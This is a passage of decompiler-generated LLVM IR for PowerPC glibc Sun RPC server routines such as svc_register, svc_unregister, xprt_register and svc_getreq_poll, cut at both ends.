  %v1_100238ec = load i32, i32* @r27, align 4
  %v2_100238ec = icmp slt i32 %v1_100238e8, %v1_100238ec
  br i1 %v2_100238ec, label %dec_label_pc_100238b0, label %dec_label_pc_100238f4

dec_label_pc_100238f4:                            ; preds = %dec_label_pc_100238e4, %entry
  %v0_10023904 = phi i32 [ %v0_100238a0, %entry ], [ %v1_100238dc.lcssa, %dec_label_pc_100238e4 ]
  ret i32 %v0_10023904

; uselistorder directives
  uselistorder i32 %v1_100238e8, { 1, 0 }
  uselistorder i32 %v1_100238e4, { 1, 0 }
  uselistorder i32 %v2_100238c8, { 1, 0 }
  uselistorder i32 (i32)* @ffs, { 1, 0 }
  uselistorder label %dec_label_pc_100238b8, { 1, 0 }
  uselistorder label %dec_label_pc_100238b0, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* %r11.global-to-local, align 4
  %v2_10023918 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_10023918, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r10, align 4
  store i32 0, i32* %stack_var_-136, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge

dec_label_pc_10023930.dec_label_pc_10023930_crit_edge: ; preds = %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.dec_label_pc_10023930.dec_label_pc_10023930_crit_edge_crit_edge, %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.lr.ph
  %v1_10023930.pre = phi i32 [ %v2_10023918, %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.lr.ph ], [ %v1_10023930.pre.pre, %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.dec_label_pc_10023930.dec_label_pc_10023930_crit_edge_crit_edge ]
  %v0_10023930.pre = phi i32 [ 0, %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.lr.ph ], [ %v0_10023930.pre.pre, %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.dec_label_pc_10023930.dec_label_pc_10023930_crit_edge_crit_edge ]
  %v1_1002393422 = phi i32 [ 4, %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.lr.ph ], [ %v1_10023934, %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.dec_label_pc_10023930.dec_label_pc_10023930_crit_edge_crit_edge ]
  %v3_10023930 = add i32 %v1_10023930.pre, %v1_1002393422
  %v4_10023930 = inttoptr i32 %v3_10023930 to i32*
  store i32 %v0_10023930.pre, i32* %v4_10023930, align 4
  %v0_10023934 = load i32, i32* %r9.global-to-local, align 4
  %v1_10023938 = add i32 %v0_10023934, 1
  store i32 %v1_10023938, i32* %r9.global-to-local, align 4
  %v0_1002393c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1002393c = add i32 %v0_1002393c, -1
  store i32 %v1_1002393c, i32* %ctr.global-to-local, align 4
  %v2_1002393c = icmp eq i32 %v1_1002393c, 0
  br i1 %v2_1002393c, label %dec_label_pc_10023940, label %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.dec_label_pc_10023930.dec_label_pc_10023930_crit_edge_crit_edge

dec_label_pc_10023930.dec_label_pc_10023930_crit_edge.dec_label_pc_10023930.dec_label_pc_10023930_crit_edge_crit_edge: ; preds = %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge
  %v1_10023934 = mul i32 %v0_10023934, 4
  %v0_10023930.pre.pre = load i32, i32* @r10, align 4
  %v1_10023930.pre.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge

dec_label_pc_10023940:                            ; preds = %dec_label_pc_10023930.dec_label_pc_10023930_crit_edge
  %phitmp23 = inttoptr i32 %v1_10023938 to i32*
  %v0_10023940.pre.pre = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10023940.pre.pre, i32* %stack_var_-136, align 4
  store i32 268581192, i32* @lr, align 4
  %v2_10023944 = call i32 @svc_getreqset(i32* %phitmp23)
  store i32 %v2_10023944, i32* %r3.global-to-local, align 4
  ret i32 %v2_10023944

; uselistorder directives
  uselistorder i32 %v1_1002393c, { 1, 0 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_10023960 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10023960, i32* @r5, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268581240, i32* @lr, align 4
  %v1_10023974 = call i32 @svc_find(i32 %v2_10023960)
  store i32 %v1_10023974, i32* @r31, align 4
  %v3_10023978 = icmp eq i32 %v1_10023974, 0
  br i1 %v3_10023978, label %dec_label_pc_100239bc, label %dec_label_pc_10023980

dec_label_pc_10023980:                            ; preds = %entry
  %v3_10023980 = load i32, i32* %stack_var_-40, align 4
  %v1_10023984 = inttoptr i32 %v1_10023974 to i32*
  %v2_10023984 = load i32, i32* %v1_10023984, align 4
  store i32 %v2_10023984, i32* @r30, align 4
  %v3_10023988 = icmp eq i32 %v3_10023980, 0
  br i1 %v3_10023988, label %dec_label_pc_10023990, label %dec_label_pc_1002399c

dec_label_pc_10023990:                            ; preds = %dec_label_pc_10023980
  store i32 268581268, i32* @lr, align 4
  %v0_10023990 = call i32 @__rpc_thread_variables()
  %v0_10023994 = load i32, i32* @r30, align 4
  %v2_10023994 = add i32 %v0_10023990, 184
  %v3_10023994 = inttoptr i32 %v2_10023994 to i32*
  store i32 %v0_10023994, i32* %v3_10023994, align 4
  br label %dec_label_pc_100239a0

dec_label_pc_1002399c:                            ; preds = %dec_label_pc_10023980
  %v2_1002399c = inttoptr i32 %v3_10023980 to i32*
  store i32 %v2_10023984, i32* %v2_1002399c, align 4
  br label %dec_label_pc_100239a0

dec_label_pc_100239a0:                            ; preds = %dec_label_pc_10023990, %dec_label_pc_1002399c
  %v0_100239a4 = load i32, i32* @r31, align 4
  store i32 %v0_100239a4, i32* @r3, align 4
  %v2_100239a8 = inttoptr i32 %v0_100239a4 to i32*
  store i32 0, i32* %v2_100239a8, align 4
  store i32 268581296, i32* @lr, align 4
  %v0_100239ac = call i32 @free()
  %v0_100239b0 = load i32, i32* @r29, align 4
  %v0_100239b4 = load i32, i32* @r28, align 4
  store i32 268581308, i32* @lr, align 4
  %v2_100239b8 = call i32 @__GI_pmap_unset(i32 %v0_100239b0, i32 %v0_100239b4)
  br label %dec_label_pc_100239bc

dec_label_pc_100239bc:                            ; preds = %entry, %dec_label_pc_100239a0
  %v0_100239cc = phi i32 [ 0, %entry ], [ %v2_100239b8, %dec_label_pc_100239a0 ]
  ret i32 %v0_100239cc

; uselistorder directives
  uselistorder label %dec_label_pc_100239bc, { 1, 0 }
  uselistorder label %dec_label_pc_100239a0, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268581360, i32* @lr, align 4
  %v0_100239ec1 = call i32 @__rpc_thread_variables()
  %v1_100239f02 = add i32 %v0_100239ec1, 184
  %v2_100239f03 = inttoptr i32 %v1_100239f02 to i32*
  %v3_100239f04 = load i32, i32* %v2_100239f03, align 4
  %v3_100239f47 = icmp eq i32 %v3_100239f04, 0
  br i1 %v3_100239f47, label %dec_label_pc_100239fc, label %dec_label_pc_100239e0

dec_label_pc_100239e0:                            ; preds = %entry, %dec_label_pc_100239e0
  %v3_100239f08 = phi i32 [ %v3_100239f0, %dec_label_pc_100239e0 ], [ %v3_100239f04, %entry ]
  %v1_100239e0 = add i32 %v3_100239f08, 8
  %v2_100239e0 = inttoptr i32 %v1_100239e0 to i32*
  %v3_100239e0 = load i32, i32* %v2_100239e0, align 4
  %v1_100239e4 = add i32 %v3_100239f08, 4
  %v2_100239e4 = inttoptr i32 %v1_100239e4 to i32*
  %v3_100239e4 = load i32, i32* %v2_100239e4, align 4
  store i32 268581356, i32* @lr, align 4
  %v3_100239e8 = call i32 @svc_unregister(i32 %v3_100239e4, i32 %v3_100239e0, i32 %v3_100239f08)
  store i32 268581360, i32* @lr, align 4
  %v0_100239ec = call i32 @__rpc_thread_variables()
  %v1_100239f0 = add i32 %v0_100239ec, 184
  %v2_100239f0 = inttoptr i32 %v1_100239f0 to i32*
  %v3_100239f0 = load i32, i32* %v2_100239f0, align 4
  %v3_100239f4 = icmp eq i32 %v3_100239f0, 0
  br i1 %v3_100239f4, label %dec_label_pc_100239fc, label %dec_label_pc_100239e0

dec_label_pc_100239fc:                            ; preds = %dec_label_pc_100239e0, %entry
  %v0_100239ec.lcssa = phi i32 [ %v0_100239ec1, %entry ], [ %v0_100239ec, %dec_label_pc_100239e0 ]
  ret i32 %v0_100239ec.lcssa

; uselistorder directives
  uselistorder i32 %v3_100239f0, { 1, 0 }
  uselistorder i32 %v3_100239f08, { 2, 0, 1 }
  uselistorder i32 268581360, { 1, 0 }
  uselistorder label %dec_label_pc_100239e0, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r26, align 4
  %v2_10023a28 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10023a28, i32* @r5, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  store i32 268581440, i32* @lr, align 4
  %v3_10023a3c = call i32 @svc_find(i32 %arg2)
  %v3_10023a40 = icmp eq i32 %v3_10023a3c, 0
  store i32 16, i32* @r3, align 4
  br i1 %v3_10023a40, label %dec_label_pc_10023a5c, label %dec_label_pc_10023a4c

dec_label_pc_10023a4c:                            ; preds = %entry
  %v1_10023a4c = add i32 %v3_10023a3c, 12
  %v2_10023a4c = inttoptr i32 %v1_10023a4c to i32*
  %v3_10023a4c = load i32, i32* %v2_10023a4c, align 4
  %v1_10023a50 = load i32, i32* @r28, align 4
  %v4_10023a50 = icmp eq i32 %v3_10023a4c, %v1_10023a50
  br i1 %v4_10023a50, label %dec_label_pc_10023a84, label %dec_label_pc_10023aac

dec_label_pc_10023a5c:                            ; preds = %entry
  store i32 268581472, i32* @lr, align 4
  %v0_10023a5c = call i32 @malloc()
  store i32 %v0_10023a5c, i32* @r31, align 4
  %v3_10023a60 = icmp eq i32 %v0_10023a5c, 0
  br i1 %v3_10023a60, label %dec_label_pc_10023aac, label %dec_label_pc_10023a68

dec_label_pc_10023a68:                            ; preds = %dec_label_pc_10023a5c
  %v0_10023a68 = load i32, i32* @r28, align 4
  %v2_10023a68 = add i32 %v0_10023a5c, 12
  %v3_10023a68 = inttoptr i32 %v2_10023a68 to i32*
  store i32 %v0_10023a68, i32* %v3_10023a68, align 4
  %v0_10023a6c = load i32, i32* @r30, align 4
  %v1_10023a6c = load i32, i32* @r31, align 4
  %v2_10023a6c = add i32 %v1_10023a6c, 4
  %v3_10023a6c = inttoptr i32 %v2_10023a6c to i32*
  store i32 %v0_10023a6c, i32* %v3_10023a6c, align 4
  %v0_10023a70 = load i32, i32* @r29, align 4
  %v1_10023a70 = load i32, i32* @r31, align 4
  %v2_10023a70 = add i32 %v1_10023a70, 8
  %v3_10023a70 = inttoptr i32 %v2_10023a70 to i32*
  store i32 %v0_10023a70, i32* %v3_10023a70, align 4
  store i32 268581496, i32* @lr, align 4
  %v0_10023a74 = call i32 @__rpc_thread_variables()
  %v1_10023a78 = add i32 %v0_10023a74, 184
  %v2_10023a78 = inttoptr i32 %v1_10023a78 to i32*
  %v3_10023a78 = load i32, i32* %v2_10023a78, align 4
  %v1_10023a7c = load i32, i32* @r31, align 4
  %v2_10023a7c = inttoptr i32 %v1_10023a7c to i32*
  store i32 %v3_10023a78, i32* %v2_10023a7c, align 4
  %v0_10023a80 = load i32, i32* @r31, align 4
  store i32 %v0_10023a80, i32* %v2_10023a78, align 4
  br label %dec_label_pc_10023a84

dec_label_pc_10023a84:                            ; preds = %dec_label_pc_10023a4c, %dec_label_pc_10023a68
  %v0_10023a84 = load i32, i32* @r27, align 4
  %v3_10023a84 = icmp eq i32 %v0_10023a84, 0
  br i1 %v3_10023a84, label %dec_label_pc_10023ab0, label %dec_label_pc_10023a9c

dec_label_pc_10023a9c:                            ; preds = %dec_label_pc_10023a84
  %v0_10023a8c = load i32, i32* @r29, align 4
  %v0_10023a88 = load i32, i32* @r30, align 4
  %v0_10023a9c = load i32, i32* @r26, align 4
  %v1_10023a9c = add i32 %v0_10023a9c, 4
  %v2_10023a9c = inttoptr i32 %v1_10023a9c to i16*
  %v3_10023a9c = load i16, i16* %v2_10023a9c, align 2
  %v4_10023a9c = zext i16 %v3_10023a9c to i32
  store i32 268581540, i32* @lr, align 4
  %v4_10023aa0 = call i32 @pmap_set(i32 %v0_10023a88, i32 %v0_10023a8c, i32 %v0_10023a84, i32 %v4_10023a9c)
  br label %dec_label_pc_10023ab0

dec_label_pc_10023aac:                            ; preds = %dec_label_pc_10023a4c, %dec_label_pc_10023a5c
  br label %dec_label_pc_10023ab0

dec_label_pc_10023ab0:                            ; preds = %dec_label_pc_10023a84, %dec_label_pc_10023a9c, %dec_label_pc_10023aac
  %v0_10023ab0 = phi i32 [ 1, %dec_label_pc_10023a84 ], [ %v4_10023aa0, %dec_label_pc_10023a9c ], [ 0, %dec_label_pc_10023aac ]
  ret i32 %v0_10023ab0

; uselistorder directives
  uselistorder i32 184, { 1, 5, 0, 3, 2, 4 }
  uselistorder i32 (i32)* @svc_find, { 1, 0 }
  uselistorder label %dec_label_pc_10023ab0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10023aac, { 1, 0 }
  uselistorder label %dec_label_pc_10023a84, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  %v2_10023adc = load i32, i32* %arg1, align 4
  store i32 %v2_10023adc, i32* @r31, align 4
  store i32 268581604, i32* @lr, align 4
  %v0_10023ae0 = call i32 @_rpc_dtablesize()
  store i32 %v0_10023ae0, i32* %r3.global-to-local, align 4
  %v2_10023ae4 = icmp slt i32 %v2_10023adc, %v0_10023ae0
  br i1 %v2_10023ae4, label %dec_label_pc_10023aec, label %dec_label_pc_10023b70

dec_label_pc_10023aec:                            ; preds = %entry
  store i32 268581616, i32* @lr, align 4
  %v0_10023aec = call i32 @__rpc_thread_variables()
  store i32 %v0_10023aec, i32* %r3.global-to-local, align 4
  %v1_10023af0 = mul i32 %v2_10023adc, 4
  %v1_10023af4 = add i32 %v0_10023aec, 180
  %v2_10023af4 = inttoptr i32 %v1_10023af4 to i32*
  %v3_10023af4 = load i32, i32* %v2_10023af4, align 4
  %v2_10023af8 = add i32 %v3_10023af4, %v1_10023af0
  %v3_10023af8 = inttoptr i32 %v2_10023af8 to i32*
  %v4_10023af8 = load i32, i32* %v3_10023af8, align 4
  %v1_10023afc = load i32, i32* @r30, align 4
  %v4_10023afc = icmp eq i32 %v4_10023af8, %v1_10023afc
  br i1 %v4_10023afc, label %dec_label_pc_10023b04, label %dec_label_pc_10023b70

dec_label_pc_10023b04:                            ; preds = %dec_label_pc_10023aec
  %v2_10023b04 = icmp sgt i32 %v2_10023adc, 1023
  store i32 0, i32* %v3_10023af8, align 4
  br i1 %v2_10023b04, label %dec_label_pc_10023b34, label %dec_label_pc_10023b14

dec_label_pc_10023b14:                            ; preds = %dec_label_pc_10023b04
  store i32 268581656, i32* @lr, align 4
  %v0_10023b14 = load i32, i32* %r3.global-to-local, align 4
  %v2_10023b14 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_10023b14, i32 %v1_10023af0)
  store i32 %v2_10023b14, i32* %r3.global-to-local, align 4
  %v1_10023b18 = call i32 @__asm_rlwinm(i32 %v2_10023adc, i32 29, i32 3, i32 29)
  store i32 %v1_10023b18, i32* @r10, align 4
  %v2_10023b1c = add i32 %v1_10023b18, %v2_10023b14
  %v3_10023b1c = inttoptr i32 %v2_10023b1c to i32*
  %v4_10023b1c = load i32, i32* %v3_10023b1c, align 4
  %v1_10023b20 = urem i32 %v2_10023adc, 32
  %v3_10023b28 = shl i32 -2, %v1_10023b20
  %v4_10023b28 = sub nsw i32 32, %v1_10023b20
  %v5_10023b28 = lshr i32 -2, %v4_10023b28
  %v6_10023b28 = or i32 %v5_10023b28, %v3_10023b28
  %v2_10023b2c = and i32 %v4_10023b1c, %v6_10023b28
  store i32 %v2_10023b2c, i32* %v3_10023b1c, align 4
  br label %dec_label_pc_10023b34

dec_label_pc_10023b34:                            ; preds = %dec_label_pc_10023b04, %dec_label_pc_10023b14
  store i32 0, i32* @r30, align 4
  store i32 268581732, i32* @lr, align 4
  %v0_10023b601 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10023b601, i32* %r3.global-to-local, align 4
  %v1_10023b642 = inttoptr i32 %v0_10023b601 to i32*
  %v2_10023b643 = load i32, i32* %v1_10023b642, align 4
  %v0_10023b684 = load i32, i32* @r30, align 4
  %v2_10023b685 = icmp slt i32 %v0_10023b684, %v2_10023b643
  br i1 %v2_10023b685, label %dec_label_pc_10023b3c, label %dec_label_pc_10023b70

dec_label_pc_10023b3c:                            ; preds = %dec_label_pc_10023b34, %dec_label_pc_10023b60.backedge
  store i32 268581696, i32* @lr, align 4
  %v0_10023b3c = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10023b3c, i32* %r3.global-to-local, align 4
  %v0_10023b40 = load i32, i32* @r30, align 4
  %v1_10023b40 = mul i32 %v0_10023b40, 8
  %v1_10023b44 = inttoptr i32 %v0_10023b3c to i32*
  %v2_10023b44 = load i32, i32* %v1_10023b44, align 4
  store i32 %v2_10023b44, i32* %r3.global-to-local, align 4
  %v1_10023b48 = add i32 %v0_10023b40, 1
  store i32 %v1_10023b48, i32* @r30, align 4
  %v2_10023b4c = add i32 %v2_10023b44, %v1_10023b40
  %v3_10023b4c = inttoptr i32 %v2_10023b4c to i32*
  %v4_10023b4c = load i32, i32* %v3_10023b4c, align 4
  %v4_10023b50 = icmp eq i32 %v4_10023b4c, %v2_10023adc
  br i1 %v4_10023b50, label %dec_label_pc_10023b58, label %dec_label_pc_10023b60.backedge

dec_label_pc_10023b58:                            ; preds = %dec_label_pc_10023b3c
  store i32 -1, i32* %v3_10023b4c, align 4
  br label %dec_label_pc_10023b60.backedge

dec_label_pc_10023b60.backedge:                   ; preds = %dec_label_pc_10023b58, %dec_label_pc_10023b3c
  store i32 268581732, i32* @lr, align 4
  %v0_10023b60 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10023b60, i32* %r3.global-to-local, align 4
  %v1_10023b64 = inttoptr i32 %v0_10023b60 to i32*
  %v2_10023b64 = load i32, i32* %v1_10023b64, align 4
  %v0_10023b68 = load i32, i32* @r30, align 4
  %v2_10023b68 = icmp slt i32 %v0_10023b68, %v2_10023b64
  br i1 %v2_10023b68, label %dec_label_pc_10023b3c, label %dec_label_pc_10023b70

dec_label_pc_10023b70:                            ; preds = %dec_label_pc_10023b60.backedge, %dec_label_pc_10023b34, %dec_label_pc_10023aec, %entry
  %v0_10023b80 = phi i32 [ %v0_10023aec, %dec_label_pc_10023aec ], [ %v0_10023ae0, %entry ], [ %v0_10023b601, %dec_label_pc_10023b34 ], [ %v0_10023b60, %dec_label_pc_10023b60.backedge ]
  ret i32 %v0_10023b80

; uselistorder directives
  uselistorder i32 %v0_10023b40, { 1, 0 }
  uselistorder i32 %v2_10023adc, { 4, 0, 2, 3, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 1, 8, 4, 5, 6, 7, 0 }
  uselistorder i32 268581732, { 1, 0 }
  uselistorder label %dec_label_pc_10023b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10023b34, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r27, align 4
  store i32 0, i32* @r30, align 4
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10023bf0

dec_label_pc_10023ba8:                            ; preds = %dec_label_pc_10023bf0
  %v3_10023ba8 = inttoptr i32 %v2_10023c00 to i32*
  %v4_10023ba8 = load i32, i32* %v3_10023ba8, align 4
  store i32 %v4_10023ba8, i32* @r31, align 4
  %v3_10023bac = icmp eq i32 %v4_10023ba8, -1
  br i1 %v3_10023bac, label %dec_label_pc_10023bec, label %dec_label_pc_10023bb4

dec_label_pc_10023bb4:                            ; preds = %dec_label_pc_10023ba8
  %v1_10023bb4 = add i32 %v2_10023c00, 6
  %v2_10023bb4 = inttoptr i32 %v1_10023bb4 to i16*
  %v3_10023bb4 = load i16, i16* %v2_10023bb4, align 2
  %v3_10023bb8 = icmp eq i16 %v3_10023bb4, 0
  br i1 %v3_10023bb8, label %dec_label_pc_10023bec, label %dec_label_pc_10023bc4

dec_label_pc_10023bc4:                            ; preds = %dec_label_pc_10023bb4
  %v1_10023bbc = and i16 %v3_10023bb4, 32
  %v3_10023bbc = icmp eq i16 %v1_10023bbc, 0
  %v1_10023bc8 = add i32 %v0_10023bfc, 1
  store i32 %v1_10023bc8, i32* @r29, align 4
  br i1 %v3_10023bbc, label %dec_label_pc_10023be8, label %dec_label_pc_10023bd0

dec_label_pc_10023bd0:                            ; preds = %dec_label_pc_10023bc4
  store i32 268581844, i32* @lr, align 4
  %v0_10023bd0 = call i32 @__rpc_thread_variables()
  %v0_10023bd4 = load i32, i32* @r31, align 4
  %v1_10023bd4 = mul i32 %v0_10023bd4, 4
  %v1_10023bd8 = add i32 %v0_10023bd0, 180
  %v2_10023bd8 = inttoptr i32 %v1_10023bd8 to i32*
  %v3_10023bd8 = load i32, i32* %v2_10023bd8, align 4
  %v2_10023bdc = add i32 %v3_10023bd8, %v1_10023bd4
  %v3_10023bdc = inttoptr i32 %v2_10023bdc to i32*
  %v4_10023bdc = load i32, i32* %v3_10023bdc, align 4
  store i32 ptrtoint (i32* @global_var_10023be4.1316 to i32), i32* @lr, align 4
  %v2_10023be0 = inttoptr i32 %v4_10023bdc to i32*
  %v3_10023be0 = call i32 @xprt_unregister(i32* %v2_10023be0, i32 %v3_10023bd8)
  br label %dec_label_pc_10023bec

dec_label_pc_10023be8:                            ; preds = %dec_label_pc_10023bc4
  store i32 268581868, i32* @lr, align 4
  %v1_10023be8 = call i32 @svc_getreq_common(i32 %v4_10023ba8)
  br label %dec_label_pc_10023bec

dec_label_pc_10023bec:                            ; preds = %dec_label_pc_10023bb4, %dec_label_pc_10023ba8, %dec_label_pc_10023bd0, %dec_label_pc_10023be8
  %v0_10023bec = load i32, i32* @r30, align 4
  %v1_10023bec = add i32 %v0_10023bec, 1
  store i32 %v1_10023bec, i32* @r30, align 4
  br label %dec_label_pc_10023bf0

dec_label_pc_10023bf0:                            ; preds = %entry, %dec_label_pc_10023bec
  store i32 268581876, i32* @lr, align 4
  %v0_10023bf0 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_10023bf4 = load i32, i32* @r30, align 4
  %v1_10023bf4 = mul i32 %v0_10023bf4, 8
  %v1_10023bf8 = inttoptr i32 %v0_10023bf0 to i32*
  %v2_10023bf8 = load i32, i32* %v1_10023bf8, align 4
  %v0_10023bfc = load i32, i32* @r29, align 4
  %v1_10023bfc = load i32, i32* @r27, align 4
  %v2_10023bfc = icmp slt i32 %v0_10023bfc, %v1_10023bfc
  %v0_10023c00 = load i32, i32* @r28, align 4
  %v2_10023c00 = add i32 %v0_10023c00, %v1_10023bf4
  %v2_10023c04 = icmp slt i32 %v0_10023bf4, %v2_10023bf8
  %brmerge.demorgan = and i1 %v2_10023c04, %v2_10023bfc
  br i1 %brmerge.demorgan, label %dec_label_pc_10023ba8, label %dec_label_pc_10023c10

dec_label_pc_10023c10:                            ; preds = %dec_label_pc_10023bf0
  ret i32 %v0_10023bf0

; uselistorder directives
  uselistorder i32 %v2_10023c00, { 1, 0 }
  uselistorder i32 %v0_10023bfc, { 1, 0 }
  uselistorder i32 %v0_10023bf4, { 1, 0 }
  uselistorder i32 %v3_10023bd8, { 1, 0 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder label %dec_label_pc_10023bf0, { 1, 0 }
  uselistorder label %dec_label_pc_10023bec, { 3, 2, 0, 1 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268581948, i32* @lr, align 4
  %v0_10023c38 = call i32 @__rpc_thread_variables()
  store i32 %v0_10023c38, i32* %r3.global-to-local, align 4
  %v1_10023c3c = add i32 %v0_10023c38, 180
  %v2_10023c3c = inttoptr i32 %v1_10023c3c to i32*
  %v3_10023c3c = load i32, i32* %v2_10023c3c, align 4
  store i32 %v0_10023c38, i32* @r31, align 4
  %v0_10023c44 = load i32, i32* @r30, align 4
  %v1_10023c44 = inttoptr i32 %v0_10023c44 to i32*
  %v2_10023c44 = load i32, i32* %v1_10023c44, align 4
  %v3_10023c48 = icmp eq i32 %v3_10023c3c, 0
  br i1 %v3_10023c48, label %dec_label_pc_10023c50, label %dec_label_pc_10023c68

dec_label_pc_10023c50:                            ; preds = %entry
  store i32 268581972, i32* @lr, align 4
  %v0_10023c50 = call i32 @_rpc_dtablesize()
  %v1_10023c54 = mul i32 %v0_10023c50, 4
  store i32 %v1_10023c54, i32* @r3, align 4
  store i32 268581980, i32* @lr, align 4
  %v0_10023c58 = call i32 @malloc()
  store i32 %v0_10023c58, i32* %r3.global-to-local, align 4
  %v3_10023c5c = icmp eq i32 %v0_10023c58, 0
  %v1_10023c60 = load i32, i32* @r31, align 4
  %v2_10023c60 = add i32 %v1_10023c60, 180
  %v3_10023c60 = inttoptr i32 %v2_10023c60 to i32*
  store i32 %v0_10023c58, i32* %v3_10023c60, align 4
  br i1 %v3_10023c5c, label %dec_label_pc_10023d4c, label %dec_label_pc_10023c68

dec_label_pc_10023c68:                            ; preds = %entry, %dec_label_pc_10023c50
  store i32 268581996, i32* @lr, align 4
  %v0_10023c68 = call i32 @_rpc_dtablesize()
  store i32 %v0_10023c68, i32* %r3.global-to-local, align 4
  %v2_10023c6c = icmp slt i32 %v2_10023c44, %v0_10023c68
  br i1 %v2_10023c6c, label %dec_label_pc_10023c74, label %dec_label_pc_10023d4c

dec_label_pc_10023c74:                            ; preds = %dec_label_pc_10023c68
  %v2_10023c74 = icmp sgt i32 %v2_10023c44, 1023
  %v0_10023c78 = load i32, i32* @r31, align 4
  %v1_10023c78 = add i32 %v0_10023c78, 180
  %v2_10023c78 = inttoptr i32 %v1_10023c78 to i32*
  %v3_10023c78 = load i32, i32* %v2_10023c78, align 4
  %v1_10023c7c = mul i32 %v2_10023c44, 4
  store i32 %v1_10023c7c, i32* %r9.global-to-local, align 4
  %v0_10023c80 = load i32, i32* @r30, align 4
  %v3_10023c80 = add i32 %v3_10023c78, %v1_10023c7c
  %v4_10023c80 = inttoptr i32 %v3_10023c80 to i32*
  store i32 %v0_10023c80, i32* %v4_10023c80, align 4
  br i1 %v2_10023c74, label %dec_label_pc_10023ca8, label %dec_label_pc_10023c88

dec_label_pc_10023c88:                            ; preds = %dec_label_pc_10023c74
  store i32 268582028, i32* @lr, align 4
  %v0_10023c88 = load i32, i32* %r3.global-to-local, align 4
  %v2_10023c88 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_10023c88, i32 %v1_10023c7c)
  store i32 %v2_10023c88, i32* %r3.global-to-local, align 4
  %v1_10023c8c = call i32 @__asm_rlwinm(i32 %v2_10023c44, i32 29, i32 3, i32 29)
  store i32 %v1_10023c8c, i32* @r10, align 4
  %v2_10023c90 = add i32 %v1_10023c8c, %v2_10023c88
  %v3_10023c90 = inttoptr i32 %v2_10023c90 to i32*
  %v4_10023c90 = load i32, i32* %v3_10023c90, align 4
  %v1_10023c94 = urem i32 %v2_10023c44, 32
  %v3_10023c9c = shl i32 1, %v1_10023c94
  %v2_10023ca0 = or i32 %v4_10023c90, %v3_10023c9c
  store i32 %v2_10023ca0, i32* %r9.global-to-local, align 4
  store i32 %v2_10023ca0, i32* %v3_10023c90, align 4
  br label %dec_label_pc_10023ca8

dec_label_pc_10023ca8:                            ; preds = %dec_label_pc_10023c74, %dec_label_pc_10023c88
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10023ce8

dec_label_pc_10023cb0:                            ; preds = %dec_label_pc_10023ce8
  store i32 268582068, i32* @lr, align 4
  %v0_10023cb0 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10023cb0, i32* %r3.global-to-local, align 4
  %v1_10023cb4 = inttoptr i32 %v0_10023cb0 to i32*
  %v2_10023cb4 = load i32, i32* %v1_10023cb4, align 4
  store i32 %v0_10023cb0, i32* %r9.global-to-local, align 4
